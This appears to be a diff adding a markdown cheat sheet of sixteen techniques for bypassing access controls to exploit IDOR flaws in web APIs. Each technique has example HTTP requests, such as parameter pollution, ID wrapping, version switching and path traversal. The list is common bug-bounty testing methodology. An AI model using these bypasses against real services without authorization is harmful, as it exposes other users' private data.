@@ -1,0 +1,182 @@
+# IDOR bypasses
+
+1. **Add parameters**
+
+GET /api/v1/getuser 
+
+[...]   
+
+Try this
+
+GET /api/v1/user?id=123                                           
+
+[…]
+
+2. **HTTP parameter pollution**
+
+POST /api/v1/profile
+
+[…]
+
+user_id=hackerid&user_id=victim
+
+3. **Add .json to the endpoint**
+
+GET /v2/getdata/1234
+
+[…]
+
+Try this
+
+GET /v2/getdata/1234.json
+
+[…]
+
+4. **Test different api versions**
+
+GET /v2/getdata/1234
+
+[…]
+
+Try this
+
+GET /v1/getdata/1234
+
+[…]
+
+5. **Wrap the ID within array**
+
+GET /v2/getdata/profile
+
+[…]
+
+{”user_id”: “111”}
+
+Try this
+
+GET /v1/getdata/profile
+
+[…]
+
+{”user_id”: [111]}
+
+6. **Wrap the ID with a JSON object**
+
+GET /v2/getdata/profile
+
+[…]
+
+{”user_id”: “111”}
+
+Try this
+
+GET /v1/getdata/profile
+
+[…]
+
+{”user_id”: {”user_id”: “111”}}
+
+7. **JSON parameter pollution**
+
+GET /v2/getdata/profile
+
+[…]
+
+{”user_id”: “111”}
+
+Try this
+
+GET /v1/getdata/profile
+
+[…]
+
+{”user_id”: “hackerid”, ”user_id”: “victimid”}
+
+8. **Try decoding the ID** 
+
+GET /v2/getdata/dmljdGltQGdtYWlsLmNvbQ==
+
+[…]
+
+“dmljdGltQGdtYWlsLmNvbQ==” ——base64——> “victim@gmail.com”
+
+9. **If Graphql is getting used**
+
+GET /graphql
+
+[…]
+
+Try this
+
+GET /graphql.php?query=
+
+[…]
+
+or try graphql map
+
+10. **MFLAC (Missing Function Level Access Control)**
+
+GET /admin/profile
+
+[…]
+
+Try this
+
+GET /ADMIN/profile
+
+11. **Swap uuid with number**
+GET /file?id=90isa-31nsd-213jj-das23ads 
+Try this
+GET /file?id=234
+
+12. **Change HTTP method**
+
+GET /file/onbase/users/45
+
+Try this
+
+POST /file/onbase/users/45
+
+Try changing it to several methods [PUT, HEAD, TRACE]
+
+You might get to see intresting responses 
+
+13. **Try Path Traversal**
+
+GET /api/v2/onbase/users/victim_id
+
+Try this if above one not working
+
+GET /api/v2/onbase/users/my_id/../victim_id
+
+14. **Change request content type**
+
+Content-type: application/xml
+
+Try this
+
+Content-type: application/json
+
+15. **Send Wildcard instead of ID**
+
+GET api/users/111
+
+Try this 
+
+GET api/users/*
+
+16.  **If endpoint has a name like /api/users/myinfo, check for /api/admins/myinfo**
+
+### Refrence:
+
+@swaysThinking - [https://rural-tune-378.notion.site/IDOR-Attack-vectors-exploitation-bypasses-and-chains-0b73eb18e9b640ce8c337af83f397a6b](https://www.notion.so/IDOR-Attack-vectors-exploitation-bypasses-and-chains-0b73eb18e9b640ce8c337af83f397a6b)
+
+OR
+
+@swaysThinking - [https://www.notion.so/IDOR-Attack-vectors-exploitation-bypasses-and-chains-0b73eb18e9b640ce8c337af83f397a6b](https://www.notion.so/IDOR-Attack-vectors-exploitation-bypasses-and-chains-0b73eb18e9b640ce8c337af83f397a6b)
+
+@Jhaddix - [https://www.youtube.com/watch?v=94-tlOCApOc](https://www.youtube.com/watch?v=94-tlOCApOc)
+
+@vickieli7 - [https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
+
+@inonst - [https://medium.com/@inonst/a-deep-dive-on-the-most-critical-api-vulnerability-bola-1342224ec3f2](https://medium.com/@inonst/a-deep-dive-on-the-most-critical-api-vulnerability-bola-1342224ec3f2)
